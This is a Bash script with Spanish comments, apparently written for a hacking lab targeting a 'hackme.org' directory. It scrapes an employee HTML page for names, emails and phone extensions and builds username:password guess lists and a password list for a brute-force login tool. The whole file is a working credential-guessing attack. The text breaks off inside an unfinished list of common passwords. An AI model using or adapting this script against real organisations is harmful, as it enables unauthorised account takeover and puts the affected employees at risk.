#!/bin/bash

cd ~/archivos/ataques_triviales

COMBINACIONES="combinaciones_numeros_internos.txt"
PASSWORDS_NUEVAS="passwords_nuevas.txt"

> $COMBINACIONES
> $PASSWORDS_NUEVAS

echo "=== Generando contraseñas desde empleados.html ==="

# Extraer apellidos (lo que está en <B>)
grep -oP '<B>\K[^<]+' empleados.html | sed 's/,//g' > apellidos_temp.txt

# Extraer nombres (después de la coma)
grep -oP '<B>[^<]+,\s*\K[^<]+' empleados.html > nombres_temp.txt

# Extraer emails
grep -oP '[a-z]+@hackme\.org' empleados.html > emails_temp.txt

# Extraer números internos (solo dígitos)
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' empleados.html > internos_temp.txt

# Mostrar cuántos de cada uno
echo "Apellidos: $(wc -l < apellidos_temp.txt)"
echo "Nombres: $(wc -l < nombres_temp.txt)"
echo "Emails: $(wc -l < emails_temp.txt)"
echo "Internos: $(wc -l < internos_temp.txt)"

# Combinar
paste apellidos_temp.txt nombres_temp.txt emails_temp.txt internos_temp.txt > empleados_data.txt

while IFS=$'\t' read -r apellido nombre email interno; do
    [ -z "$apellido" ] && continue
    
    apellido=$(echo "$apellido" | xargs | tr '[:upper:]' '[:lower:]')
    nombre=$(echo "$nombre" | xargs | tr '[:upper:]' '[:lower:]')
    email=$(echo "$email" | xargs | tr '[:upper:]' '[:lower:]')
    interno=$(echo "$interno" | xargs)
    
    # Usuario desde email (parte antes del @)
    usuario=$(echo "$email" | cut -d'@' -f1)
    
    # Saltar si no hay usuario
    [ -z "$usuario" ] && continue
    
    echo "Procesando: $usuario (interno: $interno)"
    
    # === COMBINACIONES ===
    
    # 1. Usuario + número interno
    if [ -n "$interno" ]; then
        echo "$usuario:$interno" >> $COMBINACIONES
        echo "$usuario:${usuario}${interno}" >> $COMBINACIONES
        echo "$usuario:${apellido}${interno}" >> $COMBINACIONES
        echo "$usuario:${interno}${usuario}" >> $COMBINACIONES
    fi
    
    # 2. Usuario + números simples
    for num in 123 1234 12345 123456; do
        echo "$usuario:$num" >> $COMBINACIONES
        echo "$usuario:${usuario}$num" >> $COMBINACIONES
    done
    
    # 3. Años
    for year in 2024 2023 2025 2022 2021 2020; do
        echo "$usuario:$year" >> $COMBINACIONES
        echo "$usuario:${usuario}$year" >> $COMBINACIONES
        echo "$usuario:${apellido}$year" >> $COMBINACIONES
    done
    
    # 4. Usuario = contraseña
    echo "$usuario:$usuario" >> $COMBINACIONES
    
    # 5. Apellido como contraseña
    if [ -n "$apellido" ]; then
        echo "$usuario:$apellido" >> $COMBINACIONES
    fi
    
    # 6. Nombre como contraseña
    if [ -n "$nombre" ]; then
        echo "$usuario:$nombre" >> $COMBINACIONES
    fi
    
    # 7. Email completo como contraseña
    if [ -n "$email" ]; then
        echo "$usuario:$email" >> $COMBINACIONES
    fi
    
done < empleados_data.txt

# Generar archivo de passwords solas (para usar con -P)
grep -oP '<TD WIDTH=365>\s*<P>\s*\K[0-9]+' empleados.html | sort -u >> $PASSWORDS_NUEVAS

# Añadir patrones comunes
cat >> $PASSWORDS_NUEVAS << 'EOF'
uno
dos
tres
cuatro
cinco 
seis
siete
ocho
nueve
cero
secreto
